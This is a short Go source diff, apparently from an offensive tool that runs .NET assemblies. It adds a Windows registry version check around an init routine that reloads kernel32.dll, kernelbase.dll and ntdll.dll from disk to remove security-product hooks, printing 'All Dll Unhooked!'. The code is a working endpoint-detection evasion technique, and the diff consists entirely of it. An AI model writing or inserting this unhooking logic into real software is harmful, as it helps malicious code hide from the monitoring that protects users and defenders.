@@ -11,23 +11,37 @@ import (
 
 
 func init(){
-	err := RefreshPE(`c:\windows\system32\kernel32.dll`)
-	if err != nil {
-		log.Println("RefreshPE failed:", err)
-	}
-	err = RefreshPE(`c:\windows\system32\kernelbase.dll`)
-	if err != nil {
-		log.Println("RefreshPE failed:", err)
-	}
-	fmt.Println("\nAll Dll Unhooked!\n")
-	err = RefreshPE(`c:\windows\system32\ntdll.dll`)
-	if err != nil {
-		log.Println("RefreshPE failed:", err)
+	Version := versionFunc()
+	if Version == "10.0" {
+		err := RefreshPE(`c:\windows\system32\kernel32.dll`)
+		if err != nil {
+			log.Println("RefreshPE failed:", err)
+		}
+		err = RefreshPE(`c:\windows\system32\kernelbase.dll`)
+		if err != nil {
+			log.Println("RefreshPE failed:", err)
+		}
+		fmt.Println("\nAll Dll Unhooked!\n")
+		err = RefreshPE(`c:\windows\system32\ntdll.dll`)
+		if err != nil {
+			log.Println("RefreshPE failed:", err)
+		}
 	}
 	
 }
 
+func versionFunc() string {
+	k, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
+	Version, _, _ :=  k.GetStringValue("CurrentVersion")
+	majorVersion, _, err := k.GetIntegerValue("CurrentMajorVersionNumber")
+	if err == nil{
+		minorVersion, _, _ := k.GetIntegerValue("CurrentMinorVersionNumber")
+		Version = strconv.FormatUint(majorVersion, 10) + "." + strconv.FormatUint(minorVersion, 10)
+	}
+	defer k.Close()
 
+	return Version
+}
 
 func main() {
 	assemblyArgs := ""
